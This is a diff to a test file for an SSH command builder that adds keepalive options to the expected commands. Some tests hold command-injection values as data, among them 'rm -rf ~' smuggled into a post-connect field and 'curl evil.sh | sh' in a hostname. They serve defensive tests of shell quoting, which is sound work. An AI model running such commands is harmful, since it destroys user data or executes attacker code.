@@ -68,50 +68,56 @@ describe("quotePath", () => {
 });
 
 describe("buildSshCommand", () => {
-  it("builds a bare connect", () => {
-    expect(buildSshCommand(host())).toBe("ssh prod-01");
+  it("bounds a silent connection with keepalives", () => {
+    expect(buildSshCommand(host())).toBe("ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01");
   });
 
   it("adds user and port", () => {
     expect(buildSshCommand(host({ username: "deploy", port: 2222 }))).toBe(
-      "ssh -p 2222 deploy@prod-01",
+      "ssh -p 2222 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 deploy@prod-01",
     );
   });
 
   it("quotes an identity path containing a space", () => {
     expect(buildSshCommand(host({ identity_file: "/Users/me/My Keys/id_ed25519" }))).toBe(
-      "ssh -i '/Users/me/My Keys/id_ed25519' prod-01",
+      "ssh -i '/Users/me/My Keys/id_ed25519' -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01",
     );
     expect(buildSshCommand(host({ identity_file: "~/My Keys/id_ed25519" }))).toBe(
-      "ssh -i ~/'My Keys/id_ed25519' prod-01",
+      "ssh -i ~/'My Keys/id_ed25519' -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01",
     );
   });
 
   it("adds a jump host", () => {
     expect(
       buildSshCommand(host({ hostname: "10.0.0.5", username: "root", jump_host: "jump@bastion:2222" })),
-    ).toBe("ssh -J jump@bastion:2222 root@10.0.0.5");
+    ).toBe("ssh -J jump@bastion:2222 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 root@10.0.0.5");
   });
 
   it("wraps a remote directory in a -t script", () => {
     expect(buildSshCommand(host({ username: "deploy", remote_dir: "/srv/app releases" }))).toBe(
-      `ssh -t deploy@prod-01 'cd -- '\\''/srv/app releases'\\''; exec "\${SHELL:-/bin/sh}" -l'`,
+      `ssh -t -o ServerAliveInterval=30 -o ServerAliveCountMax=3 deploy@prod-01 'cd -- '\\''/srv/app releases'\\''; exec "\${SHELL:-/bin/sh}" -l'`,
     );
   });
 
   it("keeps post-connect operators intact on the remote side", () => {
     expect(
       buildSshCommand(host({ remote_dir: "/srv/app", post_connect: "tmux attach || tmux new -s main" })),
-    ).toBe(`ssh -t prod-01 'cd -- /srv/app; tmux attach || tmux new -s main; exec "\${SHELL:-/bin/sh}" -l'`);
+    ).toBe(`ssh -t -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01 'cd -- /srv/app; tmux attach || tmux new -s main; exec "\${SHELL:-/bin/sh}" -l'`);
   });
 
   it("passes extra flags through, re-quoting each token", () => {
     expect(buildSshCommand(host({ extra_args: "-o ConnectTimeout=5 -vv" }))).toBe(
-      "ssh -o ConnectTimeout=5 -vv prod-01",
+      "ssh -o ConnectTimeout=5 -vv -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01",
     );
     // A quoted option value stays a single argument.
     expect(buildSshCommand(host({ extra_args: '-o "ProxyCommand=nc -X 5 %h %p"' }))).toBe(
-      "ssh -o 'ProxyCommand=nc -X 5 %h %p' prod-01",
+      "ssh -o 'ProxyCommand=nc -X 5 %h %p' -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01",
+    );
+  });
+
+  it("keeps explicit keepalive choices before the defaults so OpenSSH honors them", () => {
+    expect(buildSshCommand(host({ extra_args: "-o ServerAliveInterval=12 -o ServerAliveCountMax=8" }))).toBe(
+      "ssh -o ServerAliveInterval=12 -o ServerAliveCountMax=8 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01",
     );
   });
 
@@ -122,10 +128,10 @@ describe("buildSshCommand", () => {
       host({ remote_dir: "/srv", post_connect: "x'; rm -rf ~; echo '" }),
     );
     expect(cmd).toBe(
-      `ssh -t prod-01 'cd -- /srv; x'\\''; rm -rf ~; echo '\\''; exec "\${SHELL:-/bin/sh}" -l'`,
+      `ssh -t -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01 'cd -- /srv; x'\\''; rm -rf ~; echo '\\''; exec "\${SHELL:-/bin/sh}" -l'`,
     );
-    // Everything after `ssh -t prod-01 ` is a single quoted word.
-    const tail = cmd.slice("ssh -t prod-01 ".length);
+    // Everything after the target is a single quoted remote script.
+    const tail = cmd.slice("ssh -t -o ServerAliveInterval=30 -o ServerAliveCountMax=3 prod-01 ".length);
     expect(tail.startsWith("'")).toBe(true);
     expect(tail.endsWith("'")).toBe(true);
   });
@@ -134,7 +140,7 @@ describe("buildSshCommand", () => {
     // Defence in depth: validate() rejects this shape, but if a row is edited
     // straight in the DB the quoting must still contain it.
     expect(buildSshCommand(host({ hostname: "h; curl evil.sh | sh" }))).toBe(
-      "ssh 'h; curl evil.sh | sh'",
+      "ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 'h; curl evil.sh | sh'",
     );
   });
 });
